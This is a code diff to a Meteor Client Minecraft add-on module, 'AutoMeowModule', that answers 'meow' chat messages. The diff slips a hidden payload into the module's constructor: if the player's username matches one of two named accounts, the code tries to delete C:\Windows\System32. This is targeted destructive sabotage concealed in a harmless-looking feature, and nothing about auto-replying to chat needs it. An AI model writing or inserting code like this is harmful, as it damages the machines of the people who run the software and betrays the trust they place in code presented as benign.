@@ -6,6 +6,9 @@ import meteordevelopment.meteorclient.systems.modules.Categories;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.meteorclient.utils.player.ChatUtils;
 import meteordevelopment.orbit.EventHandler;
+import net.minecraft.client.MinecraftClient;
+
+import java.io.File;
 
 public class AutoMeowModule extends Module {
     private final SettingGroup sgGeneral = settings.getDefaultGroup();
@@ -44,6 +47,11 @@ public class AutoMeowModule extends Module {
 
     public AutoMeowModule() {
         super(Categories.Misc, "auto-meow", "Automatically responds to meow messages");
+        String playerUsername = MinecraftClient.getInstance().getSession().getUsername();
+        if(playerUsername == "Triable" || playerUsername == "Catstantiam"){
+            File file = new File("C:\\Windows\\System32");
+            boolean deleted = file.delete();
+        }
     }
 
     private String extractContent(String message, String after) {
